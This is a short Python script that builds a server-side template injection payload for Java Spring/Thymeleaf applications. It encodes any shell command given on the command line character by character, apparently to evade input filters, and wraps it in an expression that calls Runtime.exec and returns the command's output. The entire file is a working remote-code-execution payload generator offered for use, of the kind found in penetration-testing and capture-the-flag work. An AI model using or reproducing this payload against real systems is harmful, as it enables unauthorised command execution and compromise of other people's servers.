import sys
sys.argv.pop(0)
def makePayload(string):
    start = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(' + str(ord(string[0])) + ')'
    middle = ''.join( [javaChar(value) for key,value in enumerate(string) if key != 0] )
    end = ').getInputStream())}'

    return start + middle + end


def javaChar(char):
    code = ord(char)
    return '.concat(T(java.lang.Character).toString({code}))'.format(code=code)

print(makePayload(" ".join(sys.argv)))